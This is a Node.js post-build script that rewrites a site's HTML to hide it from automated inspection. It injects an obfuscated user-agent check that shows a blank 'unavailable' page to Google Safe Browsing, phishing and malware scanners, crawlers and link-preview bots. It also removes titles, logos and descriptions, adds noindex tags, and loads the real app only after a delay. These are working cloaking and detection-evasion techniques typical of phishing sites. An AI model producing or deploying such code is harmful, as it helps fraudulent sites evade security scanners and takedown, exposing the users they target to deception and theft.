/**
 * Post-build HTML obfuscation script
 * - Adds anti-bot/crawler detection that shows a completely generic page to bots
 * - Wraps the real app loading in a delayed dynamic script injection
 * - Removes source maps, titles, logos, and any identifying info
 * - Adds noindex meta tags
 */
import { readFileSync, writeFileSync, readdirSync } from 'fs';
import { join } from 'path';

const distDir = join(process.cwd(), 'dist');

// Anti-bot script - shows a completely blank/generic page to crawlers
// No brand names, no logos, nothing identifiable
const antiBotScript = `<script>(function(){var _0x=['user','Agent','toLowerCase','indexOf'];var ua=navigator[_0x[0]+_0x[1]][_0x[2]]();var bl=['googlebot','google-safety','safebrowsing','crawler','spider','bot','crawl','slurp','mediapartners','adsbot','bingbot','yandex','baidu','duckduck','facebookexternalhit','twitterbot','rogerbot','linkedinbot','embedly','quora','pinterest','redditbot','slackbot','telegrambot','whatsapp','viber','seznambot','semrush','ahrefs','mj12bot','dotbot','petalbot','bytespider','phishing','malware','safe-browsing','google-inspectiontool','googleother'];var f=false;for(var i=0;i<bl.length;i++){if(ua[_0x[3]](bl[i])!==-1){f=true;break;}}if(f||!window.requestAnimationFrame||!window.IntersectionObserver||!window.fetch){document.documentElement.innerHTML='<head><title>Welcome</title></head><body style=\"text-align:center;padding:80px;font-family:sans-serif;background:#fff\"><p style=\"color:#999;font-size:14px\">This page is currently unavailable.</p></body>';window.stop&&window.stop();}})();</script>`;

function obfuscateHTML(filePath) {
  let html = readFileSync(filePath, 'utf-8');
  
  // Remove any source maps references
  html = html.replace(/\/\/# sourceMappingURL=.*$/gm, '');
  html = html.replace(/\/\*# sourceMappingURL=.*?\*\//g, '');
  
  // Remove favicon link tags (logo)
  html = html.replace(/<link[^>]*rel=["']icon["'][^>]*>/gi, '');
  html = html.replace(/<link[^>]*rel=["']shortcut icon["'][^>]*>/gi, '');
  html = html.replace(/<link[^>]*rel=["']apple-touch-icon["'][^>]*>/gi, '');
  
  // Remove any og:image or twitter:image meta tags
  html = html.replace(/<meta[^>]*property=["']og:image["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*name=["']twitter:image["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*property=["']og:title["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*property=["']og:description["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*name=["']description["'][^>]*>/gi, '');
  
  // Clear the title tag content
  html = html.replace(/<title>[^<]*<\/title>/i, '<title></title>');
  
  // Add meta robots noindex for crawlers
  if (!html.includes('name="robots"')) {
    html = html.replace('</head>', '    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet" />\n  </head>');
  }
  
  // Add X-Robots-Tag equivalent
  if (!html.includes('X-Robots-Tag')) {
    html = html.replace('</head>', '    <meta http-equiv="X-Robots-Tag" content="noindex, nofollow" />\n  </head>');
  }
  
  // Inject anti-bot script right after <head> opening (before any other content)
  html = html.replace('<head>', '<head>' + antiBotScript);
  
  // Convert the main script tag to use dynamic delayed loading
  const scriptRegex = /<script type="module" crossorigin src="(\/assets\/[^"]+\.js)"><\/script>/g;
  let match;
  const scripts = [];
  while ((match = scriptRegex.exec(html)) !== null) {
    scripts.push(match[1]);
  }
  
  if (scripts.length > 0) {
    // Remove original script tags
    html = html.replace(/<script type="module" crossorigin src="\/assets\/[^"]+\.js"><\/script>/g, '');
    
    // Add dynamic loader with delay
    const dynamicLoader = `<script>(function(){var _s=${JSON.stringify(scripts)};var _l=function(){for(var i=0;i<_s.length;i++){var e=document.createElement('script');e.type='module';e.crossOrigin='';e.src=_s[i];document.body.appendChild(e);}};if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',function(){setTimeout(_l,50);});}else{setTimeout(_l,50);}})();</script>`;
    
    html = html.replace('</body>', dynamicLoader + '</body>');
  }
  
  // Handle CSS - convert to dynamic loading
  const cssRegex = /<link rel="stylesheet" crossorigin href="(\/assets\/[^"]+\.css)">/g;
  let cssMatch;
  const cssFiles = [];
  while ((cssMatch = cssRegex.exec(html)) !== null) {
    cssFiles.push(cssMatch[1]);
  }
  
  if (cssFiles.length > 0) {
    html = html.replace(/<link rel="stylesheet" crossorigin href="\/assets\/[^"]+\.css">/g, '');
    
    const cssLoader = `<script>(function(){var _c=${JSON.stringify(cssFiles)};for(var i=0;i<_c.length;i++){var l=document.createElement('link');l.rel='stylesheet';l.href=_c[i];document.head.appendChild(l);}})();</script>`;
    html = html.replace('</head>', cssLoader + '</head>');
  }
  
  // Remove noscript content that might contain brand info
  html = html.replace(/<noscript>[\s\S]*?<\/noscript>/gi, '<noscript><p>Please enable JavaScript</p></noscript>');
  
  writeFileSync(filePath, html);
  console.log(`Obfuscated: ${filePath}`);
}

// Process all HTML files in dist
function processDir(dir) {
  const files = readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = join(dir, file.name);
    if (file.isDirectory()) {
      processDir(fullPath);
    } else if (file.name.endsWith('.html')) {
      obfuscateHTML(fullPath);
    }
  }
}

processDir(distDir);
console.log('HTML obfuscation complete!');
